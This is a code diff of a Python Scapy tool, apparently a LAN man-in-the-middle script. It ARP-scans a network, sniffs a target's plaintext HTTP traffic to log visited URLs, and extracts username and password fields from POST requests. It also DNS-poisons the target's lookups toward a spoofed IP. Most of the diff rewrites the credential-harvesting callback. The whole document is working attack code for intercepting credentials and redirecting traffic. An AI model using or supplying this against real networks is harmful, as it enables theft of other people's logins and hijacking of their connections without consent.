@@ -26,11 +26,12 @@ else:
 parser = argparse.ArgumentParser(description='Device network sniffer')
 parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
 parser.add_argument('--iface', help='Network interface to use', required=True)
-parser.add_argument('--routerip', help='IP of your home router ', required=True)
+parser.add_argument('--routerip', help='IP of your home router', required=True)
 opts = parser.parse_args()
 
 def arp_scan(network, iface):
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=5, iface=iface, verbose=False)
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
+                 timeout=5, iface=iface, verbose=False)
     print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
     for i in ans:
         mac = i.answer[ARP].hwsrc
@@ -70,31 +71,33 @@ class Device:
         def arp_pkt_callback(pkt):
             if pkt.haslayer(ARP) and pkt[ARP].op == 1:
                 print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
-        sniff(iface=self.iface, prn=arp_pkt_callback, filter=f'arp and host {self.targetip}', store=0)
+        sniff(iface=self.iface, prn=arp_pkt_callback,
+              filter=f'arp and host {self.targetip}', store=0)
 
     def http_sniff(self):
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
-                raw_data = pkt['Raw'].load.decode('utf-8', errors='ignore')
-                lines = raw_data.split('\r\n')
-                host = ''
-                path = ''
-                creds_found = False
+                raw_data = pkt['Raw'].load.decode(errors='ignore')
+                if "POST" in raw_data or "GET" in raw_data:
+                    if "Host:" in raw_data and "GET" in raw_data:
+                        try:
+                            host = raw_data.split("Host: ")[1].split("\r\n")[0]
+                            path = raw_data.split("GET ")[1].split(" HTTP")[0]
+                            url = f"http://{host}{path}"
+                            print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
+                        except Exception:
+                            pass
 
-                for line in lines:
-                    if line.startswith("Host:"):
-                        host = line.split("Host:")[1].strip()
-                    if line.startswith("GET") or line.startswith("POST"):
-                        path = line.split()[1]
-                    if any(keyword in line.lower() for keyword in ["username", "user", "email", "password", "passwd", "login"]):
-                        creds_found = True
+                    if "POST" in raw_data:
+                        if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
+                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
+                            print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
+                            for line in raw_data.split('\r\n'):
+                                if '=' in line and len(line) < 100:
+                                    print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
 
-                if host and path and not creds_found:
-                    print(f'{Fore.CYAN}Visited Page: http://{host}{path}{Style.RESET_ALL}')
-                elif creds_found:
-                    print(f'{Fore.RED}Possible Credentials Detected:{Style.RESET_ALL}\n{Fore.YELLOW}{raw_data}{Style.RESET_ALL}')
-
-        sniff(iface=self.iface, prn=http_pkt_callback, filter=f'tcp port 80 and host {self.targetip}', store=0)
+        sniff(iface=self.iface, prn=http_pkt_callback,
+              filter=f'tcp port 80 and host {self.targetip}', store=0)
 
     def dns_poison(self, spoof_ip):
         def dns_pkt_callback(pkt):
@@ -105,7 +108,8 @@ class Device:
                                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
                 send(spoofed_pkt, iface=self.iface, verbose=False)
                 print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
-        sniff(iface=self.iface, prn=dns_pkt_callback, filter=f'udp port 53 and host {self.targetip}', store=0)
+        sniff(iface=self.iface, prn=dns_pkt_callback,
+              filter=f'udp port 53 and host {self.targetip}', store=0)
 
     def sniff(self):
         while True:
